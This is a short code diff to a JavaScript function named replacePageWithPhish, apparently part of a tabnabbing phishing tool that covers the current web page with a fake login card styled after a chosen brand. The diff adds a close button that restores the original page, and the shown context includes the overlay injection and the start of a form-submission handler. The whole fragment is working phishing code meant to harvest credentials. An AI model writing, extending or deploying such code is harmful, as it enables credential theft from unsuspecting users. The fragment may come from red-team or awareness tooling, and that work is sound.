@@ -92,8 +92,9 @@ async function replacePageWithPhish(options = {}) {
       background: ${bgColor}; display: flex; align-items: center; justify-content: center;
       font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
       z-index: 999999;">
-      <div style="max-width: 400px; width: 100%; padding: 48px 40px 36px; background: white;
+      <div style="position: relative; max-width: 400px; width: 100%; padding: 48px 40px 36px; background: white;
         border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;">
+        <button id="__tabnapp_close_btn" aria-label="Close" style="position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #5f6368; cursor: pointer; line-height: 1; z-index: 10;">&times;</button>
         <div style="margin-bottom: 24px; font-size: 32px; font-weight: 500; color: ${color};">
           ${template.logo || '[KEY]'}
         </div>
@@ -123,6 +124,9 @@ async function replacePageWithPhish(options = {}) {
     document.body.style.margin = '0';
     document.body.style.padding = '0';
     document.body.insertAdjacentHTML('afterbegin', phishingHTML);
+
+    const closeBtn = document.getElementById('__tabnapp_close_btn');
+    if (closeBtn) closeBtn.addEventListener('click', restoreOriginal);
 
     // Handle submission
     const submitHandler = (e) => {
